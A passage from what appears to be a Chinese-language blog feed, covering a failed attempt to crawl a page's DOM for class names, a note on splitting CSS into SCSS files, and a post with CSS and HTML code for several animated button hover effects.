的这个大体结构。<br>但是这个并不是我想要的结果，这个遍历的逻辑其实可以写得很简单才对。<br>好了写了一会儿，这个逻辑清晰了，但是有一个问题，就是得不到本元素的<code>attribs</code>属性，导致整个输出会缺少每一代的第二个子元素，我只想到一个办法把它加上去：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function getChildAndBro<span class="params">(startNode)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="params">($(startNode)</span><span class="string">.children</span><span class="params">()</span><span class="string">.length</span> !== 0) &#123;</span><br><span class="line">        console.log<span class="params">($(startNode)</span><span class="string">.children</span><span class="params">()</span><span class="string">.parent</span><span class="params">()</span>[0]<span class="string">.attribs</span>);</span><br><span class="line">        <span class="keyword">if</span> <span class="params">(loged.indexOf($(startNode)</span><span class="string">.children</span><span class="params">()</span>[0]<span class="string">.attribs</span>) == -1) &#123;</span><br><span class="line">            console.log<span class="params">($(startNode)</span><span class="string">.children</span><span class="params">()</span>[0]<span class="string">.attribs</span>);</span><br><span class="line">            loged.push<span class="params">($(startNode)</span><span class="string">.children</span><span class="params">()</span>[0]<span class="string">.attribs</span>);</span><br><span class="line">            getChildAndBro<span class="params">($(startNode)</span><span class="string">.children</span><span class="params">()</span>[0]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="params">($(startNode)</span><span class="string">.next</span><span class="params">()</span><span class="string">.length</span> !== 0) &#123;</span><br><span class="line">                console.log<span class="params">($(startNode)</span><span class="string">.next</span><span class="params">()</span><span class="string">.attribs</span>);</span><br><span class="line">                <span class="keyword">if</span> <span class="params">(loged.indexOf($(startNode)</span><span class="string">.next</span><span class="params">()</span><span class="string">.attribs</span>) == -1) &#123;</span><br><span class="line">                    loged.push<span class="params">($(startNode)</span><span class="string">.next</span><span class="params">()</span><span class="string">.attribs</span>);</span><br><span class="line">                    getChildAndBro<span class="params">($(startNode)</span><span class="string">.next</span><span class="params">()</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        getChildAndBro<span class="params">($(startNode)</span><span class="string">.next</span><span class="params">()</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>手动把重复的和无关属性去掉之后是这样的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123; id: <span class="string">'main'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'behind'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'back'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'fa fa-times-circle-o'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'container'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'navigator'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'navbar navbar-default navbar-fixed-top'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'nav-container'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'nav navbar-nav navbar-left'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'navbar-header'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'dropdown'</span> &#125;</span><br><span class="line">  <span class="class"><span class="keyword">class</span>:</span> <span class="string">'dropdown-toggle'</span>,</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'fa fa-tags fa-lg'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'dropdown-content'</span> &#125;</span><br><span class="line">&#123; id: <span class="string">'site_search'</span>, <span class="class"><span class="keyword">class</span>:</span> <span class="string">''</span> &#125;</span><br><span class="line">  id: <span class="string">'local-search-input'</span>,</span><br><span class="line">  <span class="class"><span class="keyword">class</span>:</span> <span class="string">'form-control'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'posts'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'post-item'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'index-title'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'excerpt'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'index-meta'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'fa fa-calendar'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'pager'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'page-number current'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'page-footer'</span> &#125;</span><br><span class="line">&#123; <span class="class"><span class="keyword">class</span>:</span> <span class="string">'clearfix'</span> &#125;</span><br></pre></td></tr></table></figure></p><p>看这个架势应该不怎么全啊，算了不搞了。</p><hr><h2 id="拆CSS，SCSS化"><a href="#拆CSS，SCSS化" class="headerlink" title="拆CSS，SCSS化"></a>拆CSS，SCSS化</h2><p>经过上面爬虫的失败，我感觉打开chrome按照顺序来排序要快得多。<br>两个小时左右吧，差不多拆完了，分成几个部分：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">animation</span><span class="selector-class">.scss</span></span><br><span class="line"><span class="selector-tag">code</span><span class="selector-class">.scss</span></span><br><span class="line"><span class="selector-tag">footer</span><span class="selector-class">.scss</span></span><br><span class="line"><span class="selector-tag">main</span><span class="selector-class">.scss</span></span><br><span class="line"><span class="selector-tag">navigator</span><span class="selector-class">.scss</span></span><br><span class="line"><span class="selector-tag">pager</span><span class="selector-class">.scss</span></span><br><span class="line"><span class="selector-tag">posts</span><span class="selector-class">.scss</span></span><br><span class="line"><span class="selector-tag">search</span><span class="selector-class">.scss</span></span><br></pre></td></tr></table></figure></p><p>在<code>main.scss</code>当中添加<code>@import</code>，把其他的导入，然后<code>color</code>都给提出来做成变量，该<code>nesting</code>的<code>nesting</code>，该<code>mixin</code>的<code>mixin</code>。<br>特别注意一下，在终端使用sass语句时，<code>--watch</code>可以配合<code>livestyle</code>热更新，相当好用。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>几个纯CSS的按钮轮子</title>
      <link href="/2016/05-11-buttonStyleInspiration/"/>
      <url>/2016/05-11-buttonStyleInspiration/</url>
      
        <content type="html"><![CDATA[<p>本篇是从 <a href="http://tympanus.net/codrops/2015/02/26/inspiration-button-styles-effects/" target="_blank" rel="noopener">codrops 的一篇文章</a>获得的灵感，文章使用css伪元素实现了很多按钮效果，看的我心动，动手自己也写一写。<br>效果可以<a href="/CV/the-Kernel-Panic-Button/">看这里</a>。<br><strong>想看的看，不想看就别看。</strong></p><hr><h2 id="Antiman-配合一个伪元素"><a href="#Antiman-配合一个伪元素" class="headerlink" title="Antiman 配合一个伪元素"></a>Antiman 配合一个伪元素</h2><p>指针悬浮时黑色边框从无到有、在周围慢慢缩小到达按钮指定边框位置，伴有按钮的背景颜色改变。<br>Ujarak，Pipaluk 效果与这个类似，只是<code>::after</code>的原始效果不同。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#antiman</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#eee</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">64px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">144px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1em</span>;</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: background-color <span class="number">0.3s</span>, color <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: background-color <span class="number">0.3s</span>, color <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#antiman</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#antiman</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">margin</span>: -<span class="number">21px</span> -<span class="number">28px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">140px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: -webkit-transform <span class="number">0.3s</span>, opacity <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: transform <span class="number">0.3s</span>, opacity <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">scale3d</span>(1.2, 1.35, 1);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale3d</span>(1.2, 1.35, 1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#antiman</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">scale3d</span>(1, 1, 1);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale3d</span>(1, 1, 1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#antiman</span><span class="selector-pseudo">:focus</span> &#123;</span><br><span class="line">    <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>主要是靠伪元素，这里要注意<code>#antiman {display: inline-block}</code>和<code>#antiman {position: absolute}</code>之间的关系，不要搞到其他地方去了。  </p><hr><h2 id="Winona-配合内部span"><a href="#Winona-配合内部span" class="headerlink" title="Winona 配合内部span"></a>Winona 配合内部span</h2><p><a href="/CV/the-Kernel-Panic-Button/">连接</a>里的<code>winona</code>按钮效果。<br>Rayen 的效果与这个类似，方向不同，加入了<code>overflow: hidden</code>。Rayen 的镂空效果请继续往下看 Wayra 按钮的实现。<br>这个按钮的文字用<code>span</code>包裹了，html结构如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"winona"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>winona<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#winona</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">64px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">144px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">32px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: border-color .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">-o-transition</span>: border-color .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: border-color .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#winona</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#3f51b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#winona</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">'winona'</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">32px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#3f51b5</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(0, 0, 0);</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(0, 0, 0);</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">-o-transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#winona</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(0, -100%, 0);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(0, -100%, 0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#winona</span> &gt; <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">-o-transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#winona</span><span class="selector-pseudo">:hover</span> &gt; <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(0, -100%, 0);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(0, -100%, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Wayra-镂空效果"><a href="#Wayra-镂空效果" class="headerlink" title="Wayra 镂空效果"></a>Wayra 镂空效果</h2><p>这个东西搞了半天，关键是<code>button</code>需要<code>overflow: hidden;</code>来遮挡关键字，<strong>前提是自身也要<code>position: relative</code></strong>，然后把位元素通过设置<code>z-index</code>的方式放在按钮下方。达到一个镂空的效果，很是好看。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#wayra</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">background</span>: transparent;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">245px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#3f51b5</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#3f51b5</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: border-color .<span class="number">3s</span>, color .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">-o-transition</span>: border-color .<span class="number">3s</span>, color .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: border-color .<span class="number">3s</span>, color .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wayra</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#37474F</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wayra</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: -<span class="number">14px</span> <span class="number">0</span> <span class="number">0</span> -<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#3f51b5</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform-origin</span>: <span class="number">50px</span> <span class="number">245px</span>;</span><br><span class="line">    <span class="attribute">transform-origin</span>: <span class="number">50px</span> <span class="number">245px</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate3d</span>(0, 0, 1, -45deg) <span class="built_in">translate3d</span>(0, -8em, 0);</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotate3d</span>(0, 0, 1, -45deg) <span class="built_in">translate3d</span>(0, -8em, 0);</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>, background-color .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">-o-transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>, background-color .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: transform .<span class="number">3s</span>, opacity .<span class="number">3s</span>, background-color .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wayra</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#37474F</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate3d</span>(0, 0, 0, 0deg) <span class="built_in">translate3d</span>(0, 0, 0);</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotate3d</span>(0, 0, 0, 0deg) <span class="built_in">translate3d</span>(0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><h2 id="Tamaya-配合两个伪元素"><a href="#Tamaya-配合两个伪元素" class="headerlink" title="Tamaya 配合两个伪元素"></a>Tamaya 配合两个伪元素</h2><p>效果请看<a href="/CV/the-Kernel-Panic-Button/">这里</a>的同名按钮。<br>感觉这个就是前几个效果的综合，有镂空也有<code>span</code>的效果。很好奇为什么设置的是伪元素的<code>hover</code>，到我光标悬浮的时候，明明已经不算是在伪元素之上了，应该回来才对啊。。。<br>html:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"tamaya"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>tamaya<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#tamaya</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">140px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#37474F</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#tamaya</span><span class="selector-pseudo">::before</span>, <span class="selector-id">#tamaya</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">'tamaya'</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#7986cb</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">140px</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: transform .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">-o-transition</span>: transform .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: transform .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#tamaya</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: -<span class="number">19px</span> -<span class="number">9px</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">1em</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">13px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#tamaya</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: -<span class="number">11px</span> -<span class="number">9px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#tamaya</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">2</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">scale3d</span>(.8, .8, .8);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale3d</span>(.8, .8, .8);</span><br><span class="line">    <span class="attribute">-webkit-transition</span>: -webkit-transform <span class="number">0.3s</span>, opacity <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">transition</span>: transform <span class="number">0.3s</span>, opacity <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#tamaya</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(0, -100%, 0);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(0, -100%, 0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#tamaya</span><span class="selector-pseudo">:hover</span><span 